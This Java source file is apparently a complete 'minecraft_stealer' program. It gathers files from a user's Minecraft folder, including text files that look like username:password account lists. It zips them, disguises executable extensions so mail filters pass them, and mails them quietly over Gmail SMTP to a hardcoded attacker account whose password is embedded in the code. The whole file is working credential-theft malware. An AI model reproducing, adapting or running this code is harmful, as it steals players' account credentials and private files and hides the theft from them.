package org.bitbucket.minecraft_stealer;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.zip.Deflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.activation.DataHandler;
import javax.mail.Authenticator;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

import org.bitbucket.minecraft_stealer.util.PlatformUtils;
import org.bitbucket.minecraft_stealer.util.StringUtils;

public final class Main {

	private static String[] arguments;

	private static boolean debug;

	private static int segment;

	private static ZipOutputStream createZip(final ByteArrayOutputStream bytesOut) {
		final ZipOutputStream zipOut = new ZipOutputStream(bytesOut);
		zipOut.setLevel(Deflater.NO_COMPRESSION);
		return zipOut;
	}

	private static void listFiles(final File directory, final List<File> files) {
		if (!directory.isDirectory()) {
			return;
		}
		for (final File file : directory.listFiles()) {
			if (file.isFile()) {
				files.add(file);
			} else {
				listFiles(file, files);
			}
		}
	}

	private static void log(final String message, final boolean error) {
		if (!debug) {
			return;
		}
		if (error) {
			System.err.println(message);
		} else {
			System.out.println(message);
		}
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		final File mcDir = PlatformUtils.minecraftDir();
		if (!mcDir.exists()) {
			return;
		}
		arguments = args;
		if (arguments.length == 0) {
			System.out.println("Not enough arguments were provided.");
			System.exit(-1);
		}
		final List<File> toSteal = new ArrayList<File>();
		boolean alts = false;
		for (final String argument : arguments) {
			if (argument.equalsIgnoreCase("--alts")) {
				alts = true;
			} else if (argument.equalsIgnoreCase("--debug")) {
				debug = true;
			} else {
				final File file = new File(mcDir, argument);
				if (file.exists()) {
					toSteal.add(file);
				}
			}
		}
		log("Starting to execute with the following arguments: " + StringUtils.list(arguments), false);
		ByteArrayOutputStream mcBytesOut = new ByteArrayOutputStream();
		ZipOutputStream mcZipOut = createZip(mcBytesOut);
		try {
			final List<File> stealFiles = new ArrayList<File>();
			listFiles(mcDir, stealFiles);
			outerLoop: for (final File dirFile : stealFiles) {
				boolean handle = false;
				if (toSteal.contains(dirFile) || toSteal.contains(dirFile.getParentFile())) {
					handle = true;
				}
				File parent = dirFile.getParentFile(), prevParent = parent;
				while (parent != null && !parent.equals(mcDir)) {
					prevParent = parent;
					parent = parent.getParentFile();
				}
				if (toSteal.contains(prevParent)) {
					handle = true;
				}
				if (alts && dirFile.getName().endsWith(".txt") && dirFile.exists()) {
					try {
						final BufferedReader reader = new BufferedReader(new FileReader(dirFile));
						String line;
						try {
							while ((line = reader.readLine()) != null) {
								if (line.startsWith("#")) {
									continue;
								}
								if (line.split(":").length < 2 || line.contains(" ")) {
									break;
								}
								handle = true;
								break;
							}
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							printError(e1);
						} finally {
							try {
								reader.close();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								printError(e);
							}
						}
					} catch (FileNotFoundException e) {
						// TODO Auto-generated catch block
						printError(e);
					}
				}
				final String VANILLA_PREFIX = "1.";
				if (!handle || !(toSteal.contains(dirFile) || toSteal.contains(dirFile.getParentFile()))
						&& (dirFile.getName().startsWith(VANILLA_PREFIX)
								|| dirFile.getParentFile().getName().startsWith(VANILLA_PREFIX))) {
					continue;
				}
				FileInputStream stealIn = null;
				try {
					final byte[] stealBytes = new byte[1024];
					stealIn = new FileInputStream(dirFile);
					int byteCount, prevByteCount = 0;
					while ((byteCount = stealIn.read(stealBytes)) > 0) {
						final int MAX_ATTACHMENT = 25000000;
						if (byteCount > MAX_ATTACHMENT) {
							continue outerLoop;
						}
						if (mcBytesOut.size() + byteCount > MAX_ATTACHMENT) {
							try {
								mcZipOut.close();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								printError(e);
							}
							sendEmail(mcBytesOut);
							mcBytesOut = new ByteArrayOutputStream();
							mcZipOut = createZip(mcBytesOut);
						}
						prevByteCount = byteCount;
					}
					final String dirPath = dirFile.getAbsolutePath(), mcPath = mcDir.getAbsolutePath();
					String entryName = dirPath.substring(dirPath.indexOf(mcPath) + mcPath.length())
							.substring(File.separator.length());
					if (StringUtils.endsWith(entryName,
							new String[] { ".ade", ".adp", ".bat", ".chm", ".cmd", ".com", ".cpl", ".exe", ".hta",
									".ins", ".isp", ".jar", ".jse", ".lib", ".lnk", ".mde", ".msc", ".msp", ".mst",
									".pif", ".scr", ".sct", ".shb", ".sys", ".vb", ".vbe", ".vbs", ".vxd", ".wsc",
									".wsf", ".wsh" })) {
						entryName += ".tmp";
					}
					mcZipOut.putNextEntry(new ZipEntry(entryName));
					mcZipOut.write(stealBytes, 0, prevByteCount);
					mcZipOut.closeEntry();
				} catch (final FileNotFoundException fileNotFoundEx) {
					printError(fileNotFoundEx);
				} finally {
					if (stealIn != null) {
						stealIn.close();
					}
				}
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			printError(e);
		} finally {
			try {
				mcZipOut.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				printError(e);
			}
		}
		sendEmail(mcBytesOut);
		log("Done executing.", false);
	}

	private static void printError(final Throwable error) {
		if (!debug) {
			return;
		}
		error.printStackTrace();
	}

	private static void sendEmail(final ByteArrayOutputStream mcBytesOut) {
		final Properties emailProps = new Properties();
		emailProps.put("mail.smtp.auth", String.valueOf(true));
		emailProps.put("mail.smtp.starttls.enable", String.valueOf(true));
		emailProps.put("mail.smtp.host", "smtp.gmail.com");
		emailProps.put("mail.smtp.port", String.valueOf(587));
		final String EMAIL_USER = "minecraft.stealer0@gmail.com";
		final Message email = new MimeMessage(Session.getInstance(emailProps, new Authenticator() {
			@Override
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(EMAIL_USER, "minecraftsteal");
			}
		}));
		try {
			final InternetAddress emailAddr = new InternetAddress(EMAIL_USER);
			try {
				email.setFrom(emailAddr);
			} catch (AddressException e1) {
				// TODO Auto-generated catch block
				printError(e1);
			} catch (MessagingException e1) {
				// TODO Auto-generated catch block
				printError(e1);
			}
			email.setRecipient(Message.RecipientType.TO, emailAddr);
			final String username = System.getProperty("user.name");
			email.setSubject("Segment " + segment + " of " + username + "'s Minecraft folder");
			final Multipart emailMultipart = new MimeMultipart();
			BodyPart emailPart = new MimeBodyPart();
			emailPart.setText("Executed with the following arguments: " + StringUtils.list(arguments));
			emailMultipart.addBodyPart(emailPart);
			emailPart = new MimeBodyPart();
			emailPart.setDataHandler(
					new DataHandler(new ByteArrayDataSource(mcBytesOut.toByteArray(), "application/x-any")));
			emailPart.setFileName("minecraft-" + username + "_" + segment + ".zip");
			emailMultipart.addBodyPart(emailPart);
			email.setContent(emailMultipart);
			Transport.send(email);
		} catch (MessagingException e1) {
			// TODO Auto-generated catch block
			printError(e1);
		}
		++segment;
	}

}
